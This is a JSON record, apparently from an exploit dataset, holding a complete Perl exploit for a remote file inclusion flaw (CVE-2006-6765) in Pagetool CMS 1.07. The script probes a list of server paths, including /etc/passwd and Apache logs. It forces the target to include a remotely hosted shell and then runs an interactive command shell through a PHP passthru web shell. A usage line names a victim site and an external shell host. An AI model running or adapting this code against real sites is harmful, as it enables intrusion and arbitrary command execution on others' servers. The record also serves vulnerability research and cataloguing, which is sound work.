{
  "id": "3000",
  "title": "Pagetool CMS 1.07 - &#039;pt_upload.php&#039; Remote File Inclusion",
  "cve": "CVE-2006-6765",
  "vuln_type": "file_upload",
  "code": "#!usr/bin/perl\r\nuse LWP::UserAgent;\r\n####################################################################\r\n#          ___   ___                         _\r\n#         / _ \\ / _ \\                       | |\r\n#     __ _| | | | | | |_ __  ___   _ __   ___| |_\r\n#   / _` | | | | | | | '_ \\/ __| | '_ \\ / _ \\ __|\r\n#  | (_| | |_| | |_| | | | \\__ \\_| | | |  __/ |_\r\n#   \\__, |\\___/ \\___/|_| |_|___(_)_| |_|\\___|\\__|\r\n#    __/ |\r\n#   |___/\r\n#\r\n#===========================INFO====================================\r\n# Impact level: HIGH\r\n#\r\n# Google: powered by pagetool or Pagetool Development Team\r\n#\r\n# browser use:\r\n# http://[ site ]/src/admin/pt_upload.php?config_file=[local server file]&ptconf[src]=[ shell ]?\r\n#\r\n#=========================VULN CODE=================================\r\n# Code:\r\n#\r\n# if (file_exists($config_file))\r\n#{\r\n#     include($config_file);\r\n#\r\n#    ...\r\n#      include($ptconf[\"src\"] . \"pagetool/pt_profile.inc\");\r\n#      include($ptconf[\"src\"] . \"pagetool/pt_functions.inc\");\r\n#===================================================================\r\n#\r\n#  Vulnerability Found by: FiSh and godXcel\r\n#\r\n#=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=\r\n                    #---Exploit---#\r\n#==========================================================#\r\n#         [Pagetool CMS <=1.07 (RFI)]\r\n#    [c]oded by TrinTiTTy -at- g00ns.net\r\n#==========================================================#\r\n#\r\n#    ! Vulnerability by FiSh and godXcel !\r\n#\r\n# Shoutz: z3r0, clorox, wicked, synical, ReZEN, grumpy,\r\n#         SiCK, and everyone else at g00ns.net\r\n#\r\n#    greetz: 13337.org, acircle.us\r\n#\r\n# www.g00ns.net | irc.g00ns.net #g00ns | www.g00ns-forum.net\r\n#\r\n#      #=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-#\r\n#      # Notes:                                     #\r\n#      # Shell example <?passthru($_GET[cmd]);?>    #\r\n#      # Shell variable: ($_GET[cmd]);              #\r\n#      #=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-#\r\n#==========================================================#\r\n\r\n$host = @ARGV[0]; $shell = @ARGV[1];\r\n\r\nif ($host =~ /http:\\/\\// || $shell =~ /http:\\/\\//)\r\n   {print \"\\n\\n [-] Don't include http:// in your links!\\n\";usage();exit();}\r\nelsif (@ARGV != 2) {head();usage();exit();}\r\nhead();\r\nprint \"\\n [!] Scanning for local server config file\\n\\n [!] Be patient...\\n\";\r\n\r\n# No credz to me for below list..\r\n@cfgs = (\"/etc/passwd\",\r\n         \"../apache/logs/error.log\",\r\n         \"../../../../apache/logs/access.log\",\r\n         \"../apache/logs/access.log\",\r\n         \"../../../../../var/log/httpd/error_log\",\r\n         \"../../apache/logs/error.log\",\r\n         \"../../apache/logs/access.log\",\r\n         \"../../../apache/logs/error.log\",\r\n         \"../../../apache/logs/access.log\",\r\n         \"../../../../apache/logs/error.log\",\r\n         \"../../../../../apache/logs/error.log\",\r\n         \"../../../../../apache/logs/access.log\",\r\n         \"../logs/error.log\",\r\n         \"../logs/access.log\",\r\n         \"../../logs/error.log\",\r\n         \"../../logs/access.log\",\r\n         \"../../../logs/error.log\",\r\n         \"../../../logs/access.log\",\r\n         \"../../../../logs/error.log\",\r\n         \"../../../../logs/access.log\",\r\n         \"../../../../../logs/error.log\",\r\n         \"../../../../../logs/access.log\",\r\n         \"../../../../../etc/httpd/logs/access_log\",\r\n         \"../../../../../etc/httpd/logs/access.log\",\r\n         \"../../../../../etc/httpd/logs/error_log\",\r\n         \"../../../../../etc/httpd/logs/error.log\",\r\n         \"../../../../../var/www/logs/access_log\",\r\n         \"../../../../../var/www/logs/access.log\",\r\n         \"../../../../../usr/local/apache/logs/access_log\",\r\n         \"../../../../../usr/local/apache/logs/access.log\",\r\n         \"../../../../../var/log/apache/access_log\",\r\n         \"../../../../../var/log/apache/access.log\",\r\n         \"../../../../../var/log/access_log\",\r\n         \"../../../../../var/www/logs/error_log\",\r\n         \"../../../../../var/www/logs/error.log\",\r\n         \"../../../../../usr/local/apache/logs/error_log\",\r\n         \"../../../../../usr/local/apache/logs/error.log\",\r\n         \"../../../../../var/log/apache/error_log\",\r\n         \"../../../../../var/log/apache/error.log\",\r\n         \"../../../../../var/log/access_log\",\r\n         \"../../../../../var/log/error_log\");\r\nscan();\r\nsub scan(){\r\n  for ($i = 0; $i <=40; ++$i){\r\n  $ag3nt = LWP::UserAgent->new() || die;\r\n  $inc = \"http://\".$host.\"/src/admin/pt_upload.php?config_file=\".$cfgs[$i].\"&ptconf[src]=http://\".$shell.\"?\";\r\n  $response = $ag3nt->get($inc);\r\n  syswrite STDOUT,\".\";\r\n  $ans = $response->content;\r\n    if( $ans =~ /500 Server closed connection without sending any data back/)\r\n       {print \"\\n\\n [-] Couldn't Include Shell...better luck next time.\\n\\n\";exit;}\r\n    elsif ($ans =~ /Cannot execute a blank command/)\r\n       {print \"\\n [+] Server File: FOUND\\n\\n [+] Executing Command Shell...\\n\\nType quit to exit shell\\n\";commands();}}}\r\nprint \"\\n\\n [-] Couldn't find valid config file...better luck next time\\n\\n\";exit;\r\n\r\nsub commands(){\r\nprint \"\\nshell\\@box \\$~ \";\r\n  $nix=<STDIN>;\r\n  chomp($nix);\r\nif ($nix =~ /quit/gmi){print \"\\n [-] Good Bye\\n\";exit();}\r\n$ag3nt = LWP::UserAgent->new() || die;\r\n$inc = \"http://\".$host.\"/src/admin/pt_upload.php?config_file=\".$cfgs[$i].\"&ptconf[src]=http://\".$shell.\"?cmd=\".$nix.'%00';\r\n$response = $ag3nt->get($inc);\r\n$ans = $response->content;\r\nif ($ans =~ /<b>Warning<\\/b>:/gmi || $ans =~ /<a href=/gmi)\r\n   {print \" \\n[-] ERROR: Bad command, permissions, website, or shell.\\n\";commands();}\r\nelse {print \"\\n$ans\";commands();}}\r\n\r\nsub head(){\r\n print q {\r\n   |======================================================|\r\n   |               Pagetool CMS <=1.07 (RFI)              |\r\n   |         [c]oded by TrinTiTTy -at- g00ns.net          |\r\n   | -----------------------------------------------------|\r\n   |                                                      |\r\n   |          Vulnerability by FiSh and godXcel           |\r\n   |            greetz: 13337.org, acircle.us             |\r\n   |                                                      |\r\n   |                   www.g00ns.net                      |\r\n   |======================================================|\r\n   }}\r\nsub usage(){\r\n print q{\r\n Usage: perl pagetool07.pl <host> <shell location>\r\n\r\n Example: perl pagetool07.pl www.victim.net www.shellsite.com/shell.txt\r\n   }\r\n }\r\n\r\n# milw0rm.com [2006-12-24]",
  "url": "https://www.exploit-db.com/exploits/3000"
}